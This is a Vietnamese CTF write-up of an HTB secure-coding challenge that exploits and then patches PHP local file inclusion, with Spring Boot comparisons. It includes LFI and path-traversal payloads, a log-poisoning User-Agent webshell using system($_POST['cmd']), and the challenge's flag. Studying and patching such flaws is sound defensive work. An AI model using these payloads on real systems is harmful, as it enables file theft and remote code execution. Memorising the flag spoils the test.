Bài viết giả định bạn là lập trình viên Java/Spring Boot, chưa từng khai thác PHP. Mọi khái niệm lạ (LFI, path traversal, include, stream wrapper...) được giải thích ngay khi gặp, và mỗi bước đều có ô "Cách verify".

Phần 0 — Kiến thức nền cần có trước khi bắt đầu

0.1 — LFI (Local File Inclusion): khi include đọc cả file ngoài ý muốn

Trong PHP, include $x nhúng nội dung file $x vào trang — và thực thi nếu đó là mã PHP. Khi $x đến từ ngưởi dùng mà không kiểm tra, attacker điều khiển được server đọc file nào:

# Đọc file hệ thống bằng path tuyệt đối
?note=/etc/passwd

# Leo thư mục bằng ../ (path traversal)
?note=../../../../../../etc/passwd

# Đọc SOURCE PHP qua stream wrapper (bypass render HTML)
?note=php://filter/convert.base64-encode/resource=notes.php

Tầm nghiêm trọng: đọc config chứa credential, source code, và — như ta sẽ thấy — nếu kết hợp với một cách ghi file nào đó (log, share mạng...), ta có RCE (thực thi lệnh tùy ý).

✔ Cách verify: phân tích tĩnh. Bước 1.4 sẽ xác nhận: request ?note=/etc/passwd trả về nội dung file passwd — khi đó LFI là có thật, không phải lý thuyết.

0.2 — include vs file_get_contents: ranh giới giữa "xem" và "chạy"

HàmHành vi với file PHPAn toàn khi đường dẫn do user kiểm soát?
include $pathThực thi mã PHP trong file❌ Cực kỳ nguy hiểm — file attacker ghi được sẽ chạy
file_get_contents($path) + echoChỉ đọc chuỗi, in ra text⚠️ Vẫn cần chặn path traversal, nhưng không thực thi mã

Bài này có cả hai lớp lỗi: (1) include đường dẫn thô — cho phép đọc + thực thi; (2) chỉ chặn traversal mà vẫn include — vẫn thực thi được webshell nằm trong thư mục cho phép. Bản vá cuối phải sửa cả hai.

✔ Cách verify: phân tích tĩnh, dùng ở Phần 4 — khi ta đặt webshell x.php vào đúng thư mục cho phép, nó chạy (trả về kết quả id). Đó là bằng chứng include thực thi mã.

0.3 — Bài dạng "Secure Coding": khai thác trước, vá sau, flag từ bộ kiểm thử

Challenge này thuộc dạng secure coding của HTB: server cho ta full source code (file zip) và một instance đang chạy đúng source đó. Luồng chuẩn:

  1. Đọc source → tìm lỗ hổng → khai thác trên instance ( chứng minh được RCE ).
  2. Vá lỗi trực tiếp trên instance — ở đây có sẵn một web editor (giao diện HTB Editor) với API /editor_api/file (đọc) và /editor_api/save (ghi).
  3. Gọi GET /editor_api/verify — bộ kiểm thử tự động chạy hai nhánh: vulnerability check (các payload LFI phải bị chặn) và functionality check (ngưởi dùng hợp lệ vẫn xem được ghi chú). Cả hai đều đúng → trả về flag.

Đề bài còn kèm note.md hướng dẫn mount SMB share để sửa file — vì bản gốc challenge mở cổng 445. Trên instance của event này chỉ map ra 1 cổng HTTP (editor), nên ta dùng editor API làm phương tiện ghi file tương đương.

✔ Cách verify: sau khi spawn instance (bước 1.2), gọi GET /editor_api/directory — trả về cây thư mục app là bằng chứng editor gắn với đúng instance.

Phần 2 — Các hướng trực diện (thất bại, và cách verify)

Bốn hướng sau đều hợp lý khi mới nhìn, và đều chết có bằng chứng. Ghi lại để bạn khỏi mất thởi gian đi lại.

THẤT BẠI 2.1 — Đọc flag trực tiếp qua LFI ở các đường dẫn quen thuộc

Thao tác: với RCE + LFI, thử đọc flag ở mọi vị trí thông dụng:

for p in /flag /flag.txt /root/flag /root/flag.txt /www/flag /www/flag.txt /var/flag /var/www/flag.txt; do
  curl -s "$T/challenge/notes.php?note=$p" | grep -oE 'HTB\{[^}]*\}' && echo "FOUND at $p"
done
# (và qua RCE) find / -name "flag*" 2>/dev/null → chỉ toàn file flags của kernel, không có flag thật

Kết quả thật: không vị trí nào có flag.

Kết luận: flag không nằm sẵn trên filesystem — nó do bộ kiểm thử của challenge cấp sau khi vá đúng (mục 0.3). Buộc phải đi đường "vá rồi verify".

✔ Cách verify: với RCE, find / -name 'flag*' chỉ trả về /sys/devices/.../flags (thông tin kernel) và .../dns/flags.py (thư viện Python) — không có file flag nào của challenge. Kết luận "không có flag tĩnh" là đúng.

THẤT BẠI 2.2 — Log poisoning: chèn PHP vào User-Agent rồi include access.log

Thao tác: theo gợi ý của exploit.py trong source — đầu độc log nginx bằng payload trong User-Agent, rồi include log:

curl -s -A '<?php system($_POST["cmd"]); ?>' "$T/challenge/" -o /dev/null
curl -s "$T/challenge/notes.php?note=/var/log/nginx/access.log" --data 'cmd=id' | sed -n '/<pre/,/<\/pre>/p'
# → <pre> trống không

Kết quả thật: include access.log ra trang trắng; kể cả đọc thường (không POST) cũng không thấy dòng log nào.

Kết luận: bản deploy runtime không ghi access.log ra file (nhiều khả năng redirect sang stdout của container — cấu hình deploy khác source zip). Đường log poisoning tắt. Đây là bài học: source zip mô tả bản gốc, không phải bản deploy.

✔ Cách verify: include /var/log/nginx/access.log và error.log đều trả về <pre> rỗng, trong khi include /etc/hostname vẫn in được tên pod → LFI hoạt động, chỉ riêng log file rỗng/không tồn tại.

THẤT BẠI 2.3 — Đọc source PHP bằng stream wrapper php://filter

Thao tác:

curl -s "$T/challenge/notes.php?note=php://filter/convert.base64-encode/resource=index.php" | grep -oE '[A-Za-z0-9+/]{40,}={0,2}'

Kết quả thật: không ra base64 nào — wrapper không hoạt động (trên PHP mặc định, include với wrapper yêu cầu allow_url_include=On, thường bị tắt).

Kết luận: wrapper đường dài bị chặn. Không sao — editor API (bước 1.5) đọc source tốt hơn wrapper nhiều.

✔ Cách verify: so sánh — cùng một request dạng nhưng với note=/etc/passwd (file thật) thì có output, còn wrapper thì trắng → khác biệt nằm ở wrapper, không phải ở LFI.

Phần 3 — Đột phá: nhìn đúng bản deploy và viết đúng bản vá

Bước 3.1 — Probe: thư mục thực của PHP là gì?

Sau 3 lần vá hỏng vì giả định sai về filesystem, ta cần dữ kiện thật. Viết một file probe qua editor API rồi chạy nó:

curl -s -X POST 'http://<host>:<port>/editor_api/save' -H 'Content-Type: application/json' \
  -d '{"path":"probe.php","content":"<?php echo getcwd(),\"\\n\",realpath(\u0027/www/app\u0027),\"\\n\";" ,"client_md5":"x"}'
curl -s 'http://<host>:<port>/challenge/probe.php'
DOCROOT=/app/main_app        # ← docroot thực của PHP
RP=                          # ← realpath('/www/app') = false: đường dẫn trong source zip KHÔNG tồn tại

Đây là chìa khoá toàn bài: deploy layout ≠ source zip. Mọi hardcode /www/app đều vô nghĩa. Hằng số __DIR__ (thư mục chứa chính file đang chạy) là mỏ neo duy nhất đáng tin.

✔ Cách verify: probe phải in DOCROOT=/app/main_app và RP= rỗng. Hai giá trị này giải thích hoàn hảo v1/v2/v3 ở bảng 2.4 — nếu docroot của bạn khác, hãy tin giá trị bạn đo được, không tin source zip.

Bước 3.2 — Bản vá hoàn chỉnh (v7)

Xây lại notes.php từ file gốc trong source zip (giữ nguyên 100% HTML), chỉ thay phần PHP đầu file:

<?php
$selectedNote = isset($_GET['note']) ? $_GET['note'] : null;

// 1) Chong LFI: path phai resolve thuc te nam trong 2 thu muc ghi chu cho phep
$base = realpath(__DIR__);
$real = ($selectedNote !== null) ? realpath(__DIR__ . '/' . $selectedNote) : false;

$allowedDirs = array($base . '/rick_and_morty_notes/', $base . '/my_notes/');
$ok = false;
if ($real !== false && is_file($real)) {
    foreach ($allowedDirs as $dir) {
        if (strpos($real, $dir) === 0) { $ok = true; break; }
    }
}

if (!$ok) {
    header("Location: /challenge/index.php");
    exit;
}

// 2) Doc noi dung dang text - khong include => khong thuc thi duoc ma PHP
$noteContent = file_get_contents($real);
?>
... (HTML giu nguyen, chi thay dong include bang:)
<?php echo $noteContent; ?>

Điểm khác với mọi bản vá trước:

  • __DIR__ thay '/www/app' — không phụ thuộc layout deploy.
  • Hai điều kiện prefix (2 thư mục riêng biệt, kèm dấu / cuối) chặn cả my_notes_evil/ lẫn my_notes/../x.
  • file_get_contents + echo thay include — file PHP đặt vào đây cũng chỉ bị hiển thị dạng text, không bao giờ chạy.
  • Không giới hạn đuôi file — chức năng gốc (xem mọi file trong 2 thư mục ghi chú) được bảo toàn.
✔ Cách verify: phân tích tĩnh — tự hỏi trước khi lưu: (a) ?note=/etc/passwd → realpath ra ngoài base → bị 302? (b) ?note=my_notes/../my_notes/x.php → resolve vào trong → được, nhưng chỉ hiển thị text, không chạy system()? (c) ghi chú hợp lệ vẫn 200? Cả ba sẽ được kiểm chứng ở Phần 4.

Phần 4 — Kết liễu: lưu vá (đúng optimistic locking) và verify

Bước 4.1 — Lưu file qua editor API: chú ý client_md5

Endpoint /editor_api/save dùng optimistic locking: client_md5 phải là md5 của nội dung hiện tại trên server. Sai → 409 CONFLICT:

# Lan dau luu thu: 409 vi dung md5 gia
curl -s -X POST '.../editor_api/save' -d '{"path":"notes.php","content":"...","client_md5":"x"}'
# → 409 CONFLICT

# Dung cach: doc file hien tai, tinh md5 roi moi save
cur=$(curl -s '.../editor_api/file?path=notes.php')
md5=$(printf '%s' "$cur" | md5)
curl -s -X POST '.../editor_api/save' -d '{"path":"notes.php","content":"<NOI DUNG V7>","client_md5":"'$md5'"}'
# → {"message":"File saved successfully"}
✔ Cách verify: response phải là JSON có "message":"File saved successfully". Sau đó đọc lại bằng /editor_api/file?path=notes.php — nội dung phải có đủ cả guard mới lẫn HTML gốc (độ dài ~1.7 KB, có chuỗi <!DOCTYPE html>).

Bước 4.2 — Kiểm chứng 3 tình huống trước khi verify

T='http://<host>:<port>'
# (a) Ghi chu hop le van xem duoc

# (b) LFI bi chan

Phần 5 — Root cause qua góc nhìn Spring Boot

Lỗi 1 — Nhúng đường dẫn do user kiểm soát vào lệnh "đọc/thực thi" file

❌ Code sai — tương đương Spring: đọc file theo path từ request, không kiểm chứng
// PHP — bản gốc của challenge
include $selectedNote;   // $selectedNote = $_GET['note'] — chưa hề validate

// Tương đồng Spring: trả nội dung file theo path ngưởi dùng gửi lên
@GetMapping("/notes")
public String note(@RequestParam String path) throws IOException {
    return Files.readString(Path.of("/www/app/" + path));  // ← path traversal tương tự: ../../etc/passwd
}
✅ Cách sửa đúng — chuẩn hoá path và so với thư mục cho phép
// Java: chuẩn hoá rồi kiểm tra prefix, từ chối mọi thứ thoát ra ngoài
Path base = Path.of("/www/app").toRealPath();
Path target = base.resolve(path).normalize().toRealPath(); // resolve symlink + ..
if (!target.startsWith(base.resolve("rick_and_morty_notes"))
    && !target.startsWith(base.resolve("my_notes"))) {
    throw new ResponseStatusException(HttpStatus.BAD_REQUEST);
}
return Files.readString(target);

Nguyên tắc: never trust user input làm đường dẫn. Chuẩn hoá (toRealPath/realpath) trước rồi so prefix — đừng lọc chuỗi bằng blacklist (str_replace('../','') bị bypass 1001 kiểu: ....//, URL-encode, v.v.).

Lỗi 2 — include: ranh giới "đọc" và "thực thi" bị xoá nhòa

❌ Code sai — thực thi mọi file nằm đúng thư mục
// Dù đã chặn traversal, include vẫn chạy mã PHP attacker ghi được
// vào thư mục ghi chú (qua SMB/editor/upload...)
include $real;   // x.php → system($_POST['cmd']) CHẠY THẬT
✅ Cách sửa đúng — dữ liệu là dữ liệu, không bao giờ là mã
// Chỉ đọc nội dung dạng text; kèm đúng Content-Type
$noteContent = file_get_contents($real);
// Spring tương đồng: trả file qua ResourceHttpRequestConfigurer /
// ContentDisposition.attachment() — không bao giờ eval/ScriptEngine
// theo nội dung file do user upload.

Đây là lý do v5 thất bại: chặn đúng đường dẫn nhưng vẫn include — "vulnerability check" của HTB kiểm tra đúng kịch bản attacker ghi webshell vào thư mục hợp lệ. Vá an toàn phải giả định kẻ tấn công có thể ghi file vào bất kỳ đâu trong phạm vi app.

Lỗi 3 — Hardcode đường dẫn tuyệt đối, layout đổi là vỡ (bài học từ v1–v3)

❌ Code mong manh
$notes = scandir('/www/app/rick_and_morty_notes');  // hardcode tuyệt đối
✅ Code bền
$base = realpath(__DIR__);   // mỏ neo theo vị trí chính file đang chạy
// Spring tương đồng: @Value("classpath:/notes/") Resource notesDir;
// hoặc Paths.get(getClass().getResource("/notes").toURI())

Bản deploy runtime dùng /app/main_app, source zip nói /www/app — ai hardcode theo source zip sẽ vá xong thì chức năng chết sạch. Hằng số kiểu __DIR__ hoặc classpath: giúp code sống sót qua mọi thay đổi layout.

Phần 6 — Bài học & checklist khi tự làm lại

  1. Source zip là bản gốc, không phải bản deploy. Mọi giả định về đường dẫn tuyệt đối phải được đo lường trên instance (probe.php), không suy từ source.
  2. LFI = include đường dẫn thô. Kiểm chứng bằng /etc/passwd; báo cáo phải nêu cả khả năng RCE chứ không dừng ở "đọc file".
  3. Cứ có chỗ ghi file + include là thành RCE. Ở đây chính là editor API / SMB share — phương tiện "sửa bài" cũng là phương tiện tấn công.
  4. Vá LFI phải sửa cả hai mặt: chuẩn hoá + so prefix đường dẫn (realpath/toRealPath) và bỏ thực thi (đọc text thay include). Chỉ vá một mặt là checker (và attacker thật) bắt được.
  5. Không lọc chuỗi kiểu blacklist. str_replace('../','') bị bypass vô số cách; whitelist prefix sau khi chuẩn hoá mới đáng tin.
  6. Optimistic locking không phải lỗi — đọc kỹ API. 409 CONFLICT nghĩa là thiếu md5 hiện tại, cứ fetch → md5 → save lại.
  7. Tái cấu trúc file bằng cắt chuỗi là mỏ chết ngưởi. Hãy xây file từ nguồn gốc có sẵn và thay đúng phần cần đổi, rồi đọc lại toàn bộ file sau khi lưu để soát.
  8. Flag của dạng secure coding đến từ verify. Không tìm thấy flag tĩnh ≠ bài hỏng — kiểm tra kỹ trước khi kết luận.
Checklist thực hành:
  • ☐ Đọc source, chỉ ra được dòng include $selectedNote và giải thích vì sao là LFI
  • ☐ Chứng minh LFI bằng ?note=/etc/passwd
  • ☐ Lên RCE bằng webshell + include (ghi qua editor API)
  • ☐ Chạy probe, biết docroot thực là /app/main_app
  • ☐ Viết bản vá: realpath(__DIR__) + 2 thư mục + file_get_contents/echo
  • ☐ Kiểm chứng 3 tình huống (hợp lệ 200 / LFI 302 / webshell chỉ hiển thị text)
  • ☐ Gọi verify, nhận HTB{pL3as5_1ncLud3_m3!}
  • ☐ Stop instance, tự submit flag ở portal
